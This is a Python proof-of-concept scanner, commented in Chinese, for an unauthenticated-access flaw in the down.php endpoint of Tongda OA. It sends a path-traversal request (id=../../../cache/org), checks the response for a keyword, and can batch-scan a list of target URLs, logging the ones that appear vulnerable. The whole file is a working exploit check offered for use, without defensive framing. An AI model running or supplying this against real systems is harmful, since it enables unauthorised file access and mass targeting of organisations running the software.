#通达OA down.php接口存在未授权访问漏洞检测POC

import requests
import argparse

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Connection": "keep-alive"
}

def check_keyword_in_response(url, keyword, output_file):
    path = '/inc/package/down.php?id=../../../cache/org'
    try:
        response = requests.get(url.strip('/')+path, headers=headers, timeout=5)

        if response.status_code == 200 and keyword in response.text:
            print(f"\033[92m[+] {url} 存在关键字 '{keyword}'\n \033[0m")
            if output_file:
                with open(output_file, 'a') as file:
                    file.write(url + '\n')
        else:
            print(f"[-] {url}不存在关键字 '{keyword}' \n")
    except requests.exceptions.RequestException as e:
        print(f"错误消息：{url}: {e}\n")


def load_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="用法：python poc.py -u url -k keyword -o output_file")

    parser.add_argument("-u", "--url", type=str, help="单个URL")
    parser.add_argument("-f", "--file", type=str, help="包含多个URL的文件")
    parser.add_argument("-k", "--keyword", type=str, default="org", help="匹配响应报文的关键字")
    parser.add_argument("-o", "--output", type=str, help="导出存在漏洞URL的文件名")

    args = parser.parse_args()

    if args.url:
        urls = [args.url]
    elif args.file:
        urls = load_urls_from_file(args.file)
    else:
        print("您必须使用 -U 提供单个 URL，或使用 -f 提供包含 URL 的文件\n")
        exit(1)

    for url in urls:
        check_keyword_in_response(url, args.keyword, args.output)